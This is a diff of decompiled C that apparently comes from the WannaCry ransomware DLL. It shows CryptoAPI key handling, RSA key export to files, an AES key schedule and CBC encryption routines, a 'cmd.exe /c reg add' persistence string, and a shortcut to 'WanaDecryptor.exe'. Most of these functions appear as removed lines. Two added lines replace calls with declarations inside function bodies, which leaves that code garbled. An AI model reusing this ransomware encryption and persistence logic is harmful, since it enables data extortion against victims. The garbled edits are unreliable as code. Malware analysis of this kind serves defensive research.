-{
-  int iVar1;
-  int iVar2;
-  
-  iVar2 = 0;
-  do {
-    iVar1 = (*DAT_1000d93c)(param_1 + 4,0,-(uint)(iVar2 != 0) & 0x1000d168,0x18,0xf0000000);
-    if (iVar1 != 0) {
-      return 1;
-    }
-    iVar2 = iVar2 + 1;
-  } while (iVar2 < 2);
-  return 0;
-}
-
-
-
-undefined4 __thiscall FUN_10003ac0(void *this,LPCSTR param_1,LPCSTR param_2)
-
-{
-  bool bVar1;
-  int iVar2;
-  undefined3 extraout_var;
-  
-  iVar2 = FUN_10003a80((int)this);
-  if (iVar2 == 0) {
-    FUN_10003bb0((int)this);
-    return 0;
-  }
-  if (param_1 == (LPCSTR)0x0) {
-    iVar2 = (*DAT_1000d940)(*(undefined4 *)((int)this + 4),&DAT_1000d054,0x114,0,0,(int)this + 8);
-    if (iVar2 == 0) {
-      FUN_10003bb0((int)this);
-      return 0;
-    }
-  }
-  else {
-    iVar2 = FUN_10003c00(this,param_1);
-    if (iVar2 == 0) {
-      iVar2 = (*DAT_1000d940)(*(undefined4 *)((int)this + 4),&DAT_1000cf40,0x114,0,0,(int)this + 0xc
-                             );
-      if (iVar2 == 0) {
-LAB_10003b86:
-        FUN_10003bb0((int)this);
-        return 0;
-      }
-      bVar1 = FUN_10004350(*(undefined4 *)((int)this + 4),(HCRYPTKEY *)((int)this + 8));
-      if (CONCAT31(extraout_var,bVar1) == 0) goto LAB_10003b86;
-      iVar2 = FUN_10004040(*(undefined4 *)((int)this + 4),*(HCRYPTKEY *)((int)this + 8),6,param_1);
-      if (iVar2 == 0) goto LAB_10003b86;
-      if (param_2 != (LPCSTR)0x0) {
-        FUN_10003c40(param_2);
-      }
-      iVar2 = FUN_10003c00(this,param_1);
-      if (iVar2 == 0) goto LAB_10003b86;
-    }
-    if (*(int *)((int)this + 0xc) != 0) {
-      (*DAT_1000d944)(*(int *)((int)this + 0xc));
-    }
-  }
-  return 1;
-}
-
-
-
-undefined4 __fastcall FUN_10003bb0(int param_1)
-
-{
-  if (*(int *)(param_1 + 8) != 0) {
-    (*DAT_1000d944)(*(int *)(param_1 + 8));
-    *(undefined4 *)(param_1 + 8) = 0;
-  }
-  if (*(int *)(param_1 + 0xc) != 0) {
-    (*DAT_1000d944)(*(int *)(param_1 + 0xc));
-    *(undefined4 *)(param_1 + 0xc) = 0;
-  }
-  if (*(HCRYPTPROV *)(param_1 + 4) != 0) {
-    CryptReleaseContext(*(HCRYPTPROV *)(param_1 + 4),0);
-    *(undefined4 *)(param_1 + 4) = 0;
-  }
-  return 1;
-}
-
-
-
-void __thiscall FUN_10003c00(void *this,LPCSTR param_1)
-
-{
-  if (*(int *)((int)this + 8) != 0) {
-    (*DAT_1000d944)(*(int *)((int)this + 8));
-    *(undefined4 *)((int)this + 8) = 0;
-  }
-  FUN_10003f00(*(undefined4 *)((int)this + 4),(undefined4 *)((int)this + 8),param_1);
-  return;
-}
-
-
-
 bool FUN_10003c40(LPCSTR param_1)
 
 {
@@ -3630,84 +4123,6 @@ void FUN_10003ef6(void)
   return;
 }
 
-
-
-undefined4 __cdecl FUN_10003f00(undefined4 param_1,undefined4 param_2,LPCSTR param_3)
-
-{
-  HANDLE hFile;
-  DWORD dwBytes;
-  HGLOBAL lpBuffer;
-  BOOL BVar1;
-  int iVar2;
-  DWORD local_20 [3];
-  void *local_14;
-  undefined *puStack_10;
-  undefined *puStack_c;
-  undefined4 local_8;
-  
-  puStack_c = &DAT_10007220;
-  puStack_10 = &DAT_10006bb6;
-  local_14 = ExceptionList;
-  local_20[0] = 0;
-  local_8 = 0;
-  ExceptionList = &local_14;
-  hFile = CreateFileA(param_3,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
-  if ((((hFile != (HANDLE)0xffffffff) &&
-       (dwBytes = GetFileSize(hFile,(LPDWORD)0x0), dwBytes != 0xffffffff)) && (dwBytes < 0x19001))
-     && (((lpBuffer = GlobalAlloc(0,dwBytes), lpBuffer != (HGLOBAL)0x0 &&
-          (BVar1 = ReadFile(hFile,lpBuffer,dwBytes,local_20,(LPOVERLAPPED)0x0), BVar1 != 0)) &&
-         (iVar2 = (*DAT_1000d940)(param_1,lpBuffer,local_20[0],0,0,param_2), iVar2 != 0)))) {
-    local_unwind2(&local_14,0xffffffff);
-    ExceptionList = local_14;
-    return 1;
-  }
-  local_unwind2(&local_14,0xffffffff);
-  ExceptionList = local_14;
-  return 0;
-}
-
-
-
-undefined4 __cdecl FUN_10004040(undefined4 param_1,HCRYPTKEY param_2,DWORD param_3,LPCSTR param_4)
-
-{
-  BOOL BVar1;
-  BYTE *pbData;
-  HANDLE hFile;
-  DWORD local_28;
-  BYTE *local_24;
-  DWORD local_20 [3];
-  void *local_14;
-  undefined *puStack_10;
-  undefined *puStack_c;
-  undefined4 local_8;
-  
-  puStack_c = &DAT_10007230;
-  puStack_10 = &DAT_10006bb6;
-  local_14 = ExceptionList;
-  local_28 = 0;
-  local_20[0] = 0;
-  local_24 = (BYTE *)0x0;
-  local_8 = 0;
-  ExceptionList = &local_14;
-  BVar1 = CryptExportKey(param_2,0,param_3,0,(BYTE *)0x0,&local_28);
-  if ((((BVar1 != 0) && (pbData = GlobalAlloc(0,local_28), local_24 = pbData, pbData != (BYTE *)0x0)
-       ) && (BVar1 = CryptExportKey(param_2,0,param_3,0,pbData,&local_28), BVar1 != 0)) &&
-     ((hFile = CreateFileA(param_4,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0),
-      hFile != (HANDLE)0xffffffff &&
-      (BVar1 = WriteFile(hFile,pbData,local_28,local_20,(LPOVERLAPPED)0x0), BVar1 != 0)))) {
-    local_unwind2(&local_14,0xffffffff);
-    ExceptionList = local_14;
-    return 1;
-  }
-  local_unwind2(&local_14,0xffffffff);
-  ExceptionList = local_14;
-  return 0;
-}
-
-
-
 undefined4 * FUN_10004170(void)
 
 {
@@ -3825,76 +4240,7 @@ undefined4 * FUN_10004170(void)
   return (undefined4 *)0x0;
 }
 
-
-
-bool __cdecl FUN_10004350(undefined4 param_1,undefined4 param_2)
-
-{
-  int iVar1;
-  
-  iVar1 = (*DAT_1000d950)(param_1,1,0x8000001,param_2);
-  return iVar1 != 0;
-}
-
-
-
 undefined4 __thiscall
-FUN_10004370(void *this,BYTE *param_1,DWORD param_2,BYTE *param_3,undefined4 *param_4)
-
-{
-  LPCRITICAL_SECTION lpCriticalSection;
-  BYTE *pBVar1;
-  undefined4 *puVar2;
-  int iVar3;
-  uint uVar4;
-  BYTE *pBVar5;
-  undefined4 uVar6;
-  
-  if (*(int *)((int)this + 8) == 0) {
-    return 0;
-  }
-  iVar3 = FUN_10004420(this,param_1,param_2);
-  pBVar1 = param_3;
-  if (iVar3 == 0) {
-    return 0;
-  }
-  if ((param_3 != (BYTE *)0x0) && (param_4 != (undefined4 *)0x0)) {
-    pBVar5 = param_3;
-    for (uVar4 = param_2 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
-      *(undefined4 *)pBVar5 = *(undefined4 *)param_1;
-      param_1 = param_1 + 4;
-      pBVar5 = pBVar5 + 4;
-    }
-    for (uVar4 = param_2 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
-      *pBVar5 = *param_1;
-      param_1 = param_1 + 1;
-      pBVar5 = pBVar5 + 1;
-    }
-    lpCriticalSection = (LPCRITICAL_SECTION)((int)this + 0x10);
-    EnterCriticalSection(lpCriticalSection);
-    puVar2 = param_4;
-    uVar6 = *param_4;
-    iVar3 = (*DAT_1000d948)(*(undefined4 *)((int)this + 8),0,1,0,pBVar1,&param_2);
-    if (iVar3 == 0) {
-      LeaveCriticalSection(lpCriticalSection);
-      return 0;
-    }
-    LeaveCriticalSection(lpCriticalSection);
-    *puVar2 = uVar6;
-  }
-  return 1;
-}
-
-
-
-void __thiscall FUN_10004420(void *this,BYTE *param_1,DWORD param_2)
-
-{
-  CryptGenRandom(*(HCRYPTPROV *)((int)this + 4),param_2,param_1);
-  return;
-}
-
-
 
 undefined4 FUN_10004440(void)
 
@@ -4094,7 +4440,7 @@ void __cdecl FUN_100047f0(undefined4 param_1)
   *(undefined1 *)((int)puVar3 + 2) = 0;
   FUN_100014a0(reinterpret_cast<char *>(&local_464));
   sprintf(local_400,s_cmd_exe__c_reg_add__s__v___s___t_1000d544,&local_498,&local_464,param_1);
-  FUN_10001080(local_400,10000,(LPDWORD)0x0);
+  extern "C" BOOL FUN_10001080(LPSTR param_1, DWORD param_2, LPDWORD param_3);
   return;
 }
 
@@ -4344,7 +4690,7 @@ void FUN_10004cd0(void)
     }
     sprintf(local_3e8,local_4c4,&local_6cc,s__WanaDecryptor__exe_lnk_1000d60c,&local_6cc,
             s__WanaDecryptor__exe_1000d5c4);
-    FUN_10001140(local_3e8);
+    void FUN_10001140(char *param_1);
   }
   return;
 }
@@ -4960,250 +5306,6 @@ undefined4 * __thiscall FUN_10005d90(void *this,byte param_1)
   return this;
 }
 
-
-
-void __fastcall FUN_10005db0(undefined4 *param_1)
-
-{
-  *param_1 = &PTR_FUN_1000acbc;
-  return;
-}
-
-
-
-void __thiscall FUN_10005dc0(void *this,byte *param_1,byte *param_2,int param_3,uint param_4)
-
-{
-  byte bVar1;
-  undefined4 uVar2;
-  int iVar3;
-  uint *puVar4;
-  uint uVar5;
-  uint uVar6;
-  int iVar7;
-  byte *pbVar8;
-  int iVar9;
-  int iVar10;
-  byte *pbVar11;
-  undefined4 *puVar12;
-  int iVar13;
-  uint *puVar14;
-  undefined4 *puVar15;
-  exception local_c [12];
-  
-  if (param_1 == (byte *)0x0) {
-    param_1 = &DAT_1000d8d8;
-    exception::exception(local_c,(char **)&param_1);
-                    // WARNING: Subroutine does not return
-    _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
-  }
-  if (((param_3 != 0x10) && (param_3 != 0x18)) && (param_3 != 0x20)) {
-    param_1 = &DAT_1000d8d8;
-    exception::exception(local_c,(char **)&param_1);
-                    // WARNING: Subroutine does not return
-    _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
-  }
-  if (((param_4 != 0x10) && (param_4 != 0x18)) && (param_4 != 0x20)) {
-    param_1 = &DAT_1000d8d8;
-    exception::exception(local_c,(char **)&param_1);
-                    // WARNING: Subroutine does not return
-    _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
-  }
-  *(int *)((int)this + 0x3c8) = param_3;
-  *(uint *)((int)this + 0x3cc) = param_4;
-  pbVar8 = param_2;
-  pbVar11 = (byte *)((int)this + 0x3d0);
-  for (uVar5 = param_4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
-    *(undefined4 *)pbVar11 = *(undefined4 *)pbVar8;
-    pbVar8 = pbVar8 + 4;
-    pbVar11 = pbVar11 + 4;
-  }
-  for (uVar5 = param_4 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
-    *pbVar11 = *pbVar8;
-    pbVar8 = pbVar8 + 1;
-    pbVar11 = pbVar11 + 1;
-  }
-  uVar5 = *(uint *)((int)this + 0x3cc);
-  pbVar8 = (byte *)((int)this + 0x3f0);
-  for (uVar6 = uVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
-    *(undefined4 *)pbVar8 = *(undefined4 *)param_2;
-    param_2 = param_2 + 4;
-    pbVar8 = pbVar8 + 4;
-  }
-  for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
-    *pbVar8 = *param_2;
-    param_2 = param_2 + 1;
-    pbVar8 = pbVar8 + 1;
-  }
-  if (*(int *)((int)this + 0x3c8) == 0x10) {
-    if (*(int *)((int)this + 0x3cc) == 0x10) {
-      iVar7 = 10;
-    }
-    else {
-      iVar7 = (-(uint)(*(int *)((int)this + 0x3cc) != 0x18) & 2) + 0xc;
-    }
-    *(int *)((int)this + 0x410) = iVar7;
-  }
-  else if (*(int *)((int)this + 0x3c8) == 0x18) {
-    *(uint *)((int)this + 0x410) = (-(uint)(*(int *)((int)this + 0x3cc) != 0x20) & 0xfffffffe) + 0xe
-    ;
-  }
-  else {
-    *(undefined4 *)((int)this + 0x410) = 0xe;
-  }
-  iVar9 = 0;
-  iVar7 = (int)(*(int *)((int)this + 0x3cc) + (*(int *)((int)this + 0x3cc) >> 0x1f & 3U)) >> 2;
-  if (-1 < *(int *)((int)this + 0x410)) {
-    puVar12 = (undefined4 *)((int)this + 8);
-    do {
-      iVar13 = iVar7;
-      puVar15 = puVar12;
-      if (0 < iVar7) {
-        for (; iVar13 != 0; iVar13 = iVar13 + -1) {
-          *puVar15 = 0;
-          puVar15 = puVar15 + 1;
-        }
-      }
-      iVar9 = iVar9 + 1;
-      puVar12 = puVar12 + 8;
-    } while (iVar9 <= *(int *)((int)this + 0x410));
-  }
-  iVar9 = 0;
-  if (-1 < *(int *)((int)this + 0x410)) {
-    puVar12 = (undefined4 *)((int)this + 0x1e8);
-    do {
-      iVar13 = iVar7;
-      puVar15 = puVar12;
-      if (0 < iVar7) {
-        for (; iVar13 != 0; iVar13 = iVar13 + -1) {
-          *puVar15 = 0;
-          puVar15 = puVar15 + 1;
-        }
-      }
-      iVar9 = iVar9 + 1;
-      puVar12 = puVar12 + 8;
-    } while (iVar9 <= *(int *)((int)this + 0x410));
-  }
-  puVar4 = (uint *)((int)this + 0x414);
-  iVar9 = (*(int *)((int)this + 0x410) + 1) * iVar7;
-  pbVar11 = (byte *)((int)(*(int *)((int)this + 0x3c8) + (*(int *)((int)this + 0x3c8) >> 0x1f & 3U))
-                    >> 2);
-  pbVar8 = param_1;
-  param_1 = pbVar11;
-  if (0 < (int)pbVar11) {
-    do {
-      *puVar4 = (uint)*pbVar8 << 0x18;
-      *puVar4 = *puVar4 | (uint)pbVar8[1] << 0x10;
-      *puVar4 = *puVar4 | (uint)pbVar8[2] << 8;
-      *puVar4 = *puVar4 | (uint)pbVar8[3];
-      param_1 = param_1 + -1;
-      pbVar8 = pbVar8 + 4;
-      puVar4 = puVar4 + 1;
-    } while (param_1 != (byte *)0x0);
-  }
-  iVar13 = 0;
-  if (0 < (int)pbVar11) {
-    param_1 = (byte *)((int)this + 0x414);
-    do {
-      if (iVar9 <= iVar13) goto LAB_100061e6;
-      iVar3 = iVar13 / iVar7;
-      iVar10 = iVar13 % iVar7;
-      *(undefined4 *)((int)this + (iVar10 + iVar3 * 8) * 4 + 8) = *(undefined4 *)param_1;
-      iVar13 = iVar13 + 1;
-      uVar2 = *(undefined4 *)param_1;
-      param_1 = param_1 + 4;
-      *(undefined4 *)((int)this + (iVar10 + (*(int *)((int)this + 0x410) - iVar3) * 8) * 4 + 0x1e8)
-           = uVar2;
-    } while (iVar13 < (int)pbVar11);
-  }
-  if (iVar13 < iVar9) {
-    param_2 = &DAT_1000ac3c;
-    do {
-      uVar5 = *(uint *)((int)this + (int)pbVar11 * 4 + 0x410);
-      bVar1 = *param_2;
-      param_2 = param_2 + 1;
-      *(uint *)((int)this + 0x414) =
-           *(uint *)((int)this + 0x414) ^
-           CONCAT31(CONCAT21(CONCAT11((&DAT_10007a3c)[uVar5 >> 0x10 & 0xff] ^ bVar1,
-                                      (&DAT_10007a3c)[uVar5 >> 8 & 0xff]),
-                             (&DAT_10007a3c)[uVar5 & 0xff]),(&DAT_10007a3c)[uVar5 >> 0x18]);
-      if (pbVar11 == (byte *)0x8) {
-        puVar4 = (uint *)((int)this + 0x418);
-        iVar3 = 3;
-        do {
-          *puVar4 = *puVar4 ^ puVar4[-1];
-          puVar4 = puVar4 + 1;
-          iVar3 = iVar3 + -1;
-        } while (iVar3 != 0);
-        uVar5 = *(uint *)((int)this + 0x420);
-        iVar3 = 3;
-        *(uint *)((int)this + 0x424) =
-             *(uint *)((int)this + 0x424) ^
-             CONCAT31(CONCAT21(CONCAT11((&DAT_10007a3c)[uVar5 >> 0x18],
-                                        (&DAT_10007a3c)[uVar5 >> 0x10 & 0xff]),
-                               (&DAT_10007a3c)[uVar5 >> 8 & 0xff]),(&DAT_10007a3c)[uVar5 & 0xff]);
-        puVar4 = (uint *)((int)this + 0x428);
-        do {
-          *puVar4 = *puVar4 ^ puVar4[-1];
-          puVar4 = puVar4 + 1;
-          iVar3 = iVar3 + -1;
-        } while (iVar3 != 0);
-      }
-      else if (1 < (int)pbVar11) {
-        puVar4 = (uint *)((int)this + 0x418);
-        pbVar8 = pbVar11 + -1;
-        do {
-          *puVar4 = *puVar4 ^ puVar4[-1];
-          puVar4 = puVar4 + 1;
-          pbVar8 = pbVar8 + -1;
-        } while (pbVar8 != (byte *)0x0);
-      }
-      param_1 = (byte *)0x0;
-      if (0 < (int)pbVar11) {
-        puVar12 = (undefined4 *)((int)this + 0x414);
-        do {
-          if (iVar9 <= iVar13) goto LAB_100061e6;
-          iVar3 = iVar13 / iVar7;
-          iVar10 = iVar13 % iVar7;
-          *(undefined4 *)((int)this + (iVar10 + iVar3 * 8) * 4 + 8) = *puVar12;
-          param_1 = param_1 + 1;
-          iVar13 = iVar13 + 1;
-          *(undefined4 *)
-           ((int)this + (iVar10 + (*(int *)((int)this + 0x410) - iVar3) * 8) * 4 + 0x1e8) = *puVar12
-          ;
-          puVar12 = puVar12 + 1;
-        } while ((int)param_1 < (int)pbVar11);
-      }
-    } while (iVar13 < iVar9);
-  }
-LAB_100061e6:
-  param_4 = 1;
-  if (1 < *(int *)((int)this + 0x410)) {
-    puVar4 = (uint *)((int)this + 0x208);
-    do {
-      puVar14 = puVar4;
-      iVar9 = iVar7;
-      if (0 < iVar7) {
-        do {
-          uVar5 = *puVar14;
-          iVar9 = iVar9 + -1;
-          *puVar14 = *(uint *)(&DAT_10009c3c + (uVar5 >> 0x18) * 4) ^
-                     *(uint *)(&DAT_1000a03c + (uVar5 >> 0x10 & 0xff) * 4) ^
-                     *(uint *)(&DAT_1000a43c + (uVar5 >> 8 & 0xff) * 4) ^
-                     *(uint *)(&DAT_1000a83c + (uVar5 & 0xff) * 4);
-          puVar14 = puVar14 + 1;
-        } while (iVar9 != 0);
-      }
-      param_4 = param_4 + 1;
-      puVar4 = puVar4 + 8;
-    } while ((int)param_4 < *(int *)((int)this + 0x410));
-  }
-  *(undefined1 *)((int)this + 4) = 1;
-  return;
-}
-
-
-
 void __thiscall FUN_10006280(void *this,byte *param_1,byte *param_2)
 
 {
@@ -5412,129 +5514,6 @@ void __thiscall FUN_10006640(void *this,uint *param_1,byte *param_2)
   FUN_10006280(this,(byte *)param_1,param_2);
   return;
 }
-
-
-
-void __thiscall FUN_10006940(void *this,uint *param_1,uint *param_2,uint param_3,uint param_4)
-
-{
-  uint *puVar1;
-  uint *puVar2;
-  uint uVar3;
-  uint uVar4;
-  int iVar5;
-  uint *puVar6;
-  bool bVar7;
-  exception local_c [12];
-  
-  if (*(char *)((int)this + 4) == '\0') {
-    exception::exception(local_c,&PTR_DAT_1000d8cc);
-                    // WARNING: Subroutine does not return
-    _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
-  }
-  if ((param_3 != 0) && (uVar4 = *(uint *)((int)this + 0x3cc), param_3 % uVar4 == 0)) {
-    if (param_4 == 1) {
-      param_4 = 0;
-      if (param_3 / uVar4 != 0) {
-        puVar2 = (uint *)((int)this + 0x3f0);
-        do {
-          if (*(char *)((int)this + 4) == '\0') {
-            exception::exception(local_c,&PTR_DAT_1000d8cc);
-                    // WARNING: Subroutine does not return
-            _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
-          }
-          iVar5 = 0;
-          if (0 < (int)uVar4) {
-            puVar1 = puVar2;
-            do {
-              *(byte *)puVar1 =
-                   (byte)*puVar1 ^ *(byte *)(((int)param_1 - (int)puVar2) + (int)puVar1);
-              puVar1 = (uint *)((int)puVar1 + 1);
-              iVar5 = iVar5 + 1;
-            } while (iVar5 < *(int *)((int)this + 0x3cc));
-          }
-          FUN_10006640(this,puVar2,(byte *)param_2);
-          uVar4 = *(uint *)((int)this + 0x3cc);
-          puVar1 = param_2;
-          puVar6 = puVar2;
-          for (uVar3 = uVar4 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
-            *puVar6 = *puVar1;
-            puVar1 = puVar1 + 1;
-            puVar6 = puVar6 + 1;
-          }
-          for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
-            *(char *)puVar6 = (char)*puVar1;
-            puVar1 = (uint *)((int)puVar1 + 1);
-            puVar6 = (uint *)((int)puVar6 + 1);
-          }
-          uVar4 = *(uint *)((int)this + 0x3cc);
-          param_1 = (uint *)((int)param_1 + uVar4);
-          param_2 = (uint *)((int)param_2 + uVar4);
-          param_4 = param_4 + 1;
-        } while (param_4 < param_3 / uVar4);
-      }
-    }
-    else {
-      bVar7 = param_4 == 2;
-      param_4 = 0;
-      if (bVar7) {
-        if (param_3 / uVar4 != 0) {
-          do {
-            FUN_10006640(this,(uint *)((int)this + 0x3f0),(byte *)param_2);
-            if (*(char *)((int)this + 4) == '\0') {
-              exception::exception(local_c,&PTR_DAT_1000d8cc);
-                    // WARNING: Subroutine does not return
-              _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
-            }
-            iVar5 = 0;
-            puVar2 = param_2;
-            if (0 < *(int *)((int)this + 0x3cc)) {
-              do {
-                *(byte *)puVar2 = (byte)*puVar2 ^ *(byte *)(iVar5 + (int)param_1);
-                puVar2 = (uint *)((int)puVar2 + 1);
-                iVar5 = iVar5 + 1;
-              } while (iVar5 < *(int *)((int)this + 0x3cc));
-            }
-            uVar4 = *(uint *)((int)this + 0x3cc);
-            puVar2 = param_2;
-            puVar1 = (uint *)((int)this + 0x3f0);
-            for (uVar3 = uVar4 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
-              *puVar1 = *puVar2;
-              puVar2 = puVar2 + 1;
-              puVar1 = puVar1 + 1;
-            }
-            for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
-              *(byte *)puVar1 = (byte)*puVar2;
-              puVar2 = (uint *)((int)puVar2 + 1);
-              puVar1 = (uint *)((int)puVar1 + 1);
-            }
-            uVar4 = *(uint *)((int)this + 0x3cc);
-            param_1 = (uint *)((int)param_1 + uVar4);
-            param_2 = (uint *)((int)param_2 + uVar4);
-            param_4 = param_4 + 1;
-          } while (param_4 < param_3 / uVar4);
-          return;
-        }
-      }
-      else if (param_3 / uVar4 != 0) {
-        do {
-          FUN_10006640(this,param_1,(byte *)param_2);
-          uVar4 = *(uint *)((int)this + 0x3cc);
-          param_1 = (uint *)((int)param_1 + uVar4);
-          param_2 = (uint *)((int)param_2 + uVar4);
-          param_4 = param_4 + 1;
-        } while (param_4 < param_3 / uVar4);
-        return;
-      }
-    }
-    return;
-  }
-  exception::exception(local_c,&PTR_DAT_1000d8d0);
-                    // WARNING: Subroutine does not return
-  _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
-}
-
-
 
 void * __cdecl operator_new(uint param_1)
 
